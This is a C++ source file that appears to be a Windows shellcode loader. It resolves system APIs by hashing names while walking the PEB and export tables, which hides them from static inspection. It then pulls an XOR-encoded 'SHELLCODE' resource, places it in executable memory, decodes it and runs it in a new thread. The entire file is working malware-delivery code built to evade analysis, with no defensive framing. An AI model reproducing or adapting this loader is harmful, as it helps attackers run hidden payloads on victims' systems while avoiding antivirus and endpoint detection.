#include "monolith.hpp"
#include "definitions.hpp"
#include "multitool.hpp"
#include "resource.hpp"

#include <cstdint>

#define FVN_OFFSET		(const unsigned int) 2166136261
#define FVN_PRIME		(const unsigned int) 16777619
#define LOCAL_HEAP		((PPEB)__readgsqword(0x60))->ProcessHeap

HMODULE GetModuleAddress(DWORD hash);
FARPROC GetSymbolAddress(HMODULE base, DWORD hash);

VOID ResolveApi(PAPI instance) {

	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATEREMOTETHREAD);
	instance->win32.NtWaitForSingleObject = (NtWaitForSingleObject_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
}

template<typename MTYPE> DWORD HashString(MTYPE string, SIZE_T length) {
	
	auto hash = FVN_OFFSET;

	for (auto i = 0; i < length; i++) {
		hash ^= string[i];
		hash *= FVN_PRIME;
	}
	return hash;
}

HMODULE GetModuleAddress(DWORD hash) {

	auto head = (PLIST_ENTRY)(&((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList);
	auto next = head->Flink;

	while (next != head) {

		auto mod = (PLDR_MODULE)((PBYTE)next - sizeof(DWORD) * 4);
		auto name = mod->BaseDllName.Buffer;

		if (name) {
			if (hash - HashString(name, wcslen(name)) == 0) {
				return (HMODULE)mod->BaseAddress;
			}
		}
		next = next->Flink;
	}
	return nullptr;
}

FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {

	if (!base) {
		return nullptr;
	}
	auto doshead	= (PIMAGE_DOS_HEADER)base;
	auto nthead	= (PIMAGE_NT_HEADERS)((PBYTE)base + doshead->e_lfanew);
	auto exports	= (PIMAGE_EXPORT_DIRECTORY)((PBYTE)doshead + (nthead)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (exports->AddressOfNames) {

		auto ordinals	= RVA(PWORD, base, exports->AddressOfNameOrdinals);
		auto functions	= RVA(PDWORD, base, exports->AddressOfFunctions);
		auto names	= RVA(PDWORD, base, exports->AddressOfNames);

		for (auto i = 0; i < exports->NumberOfNames; i++) {
			auto name = RVA(LPSTR, base, names[i]);

			if (hash - HashString(name, strlen(name)) == 0) {
				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
			}
			continue;
		}
		return nullptr;
	}
}

int main() {

	HANDLE hThread 		= { 0 };
	DWORD protect 		= { 0 };
	LPVOID lpBuffer 	= { 0 };
	NTSTATUS ntstatus 	= { 0 };
	PRESOURCE resource 	= { 0 };

	RtlAllocateHeap_t RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
	RtlFreeHeap_t RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);

	resource = (PRESOURCE)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));
	PAPI instance = (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));

	ResolveApi(instance);

	resource		= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA);
	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);

	printf("resource loaded, allocating\n");

	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NT_SUCCESS(ntstatus)) {

		printf("copying resources to buffer\n");
		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);

		printf("decipher\n");
		for (auto i = 0; i < resource->Length; i++) {
			((PBYTE)lpBuffer)[i] ^= 0x0A;
		}

		printf("changing page protections\n");
		ntstatus = instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect);
		if (NT_SUCCESS(ntstatus)) {
			printf("creating thread\n");
			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
		} 	
	}
	printf("exit code: 0x%lx\n", ntstatus);
	return 0;
}

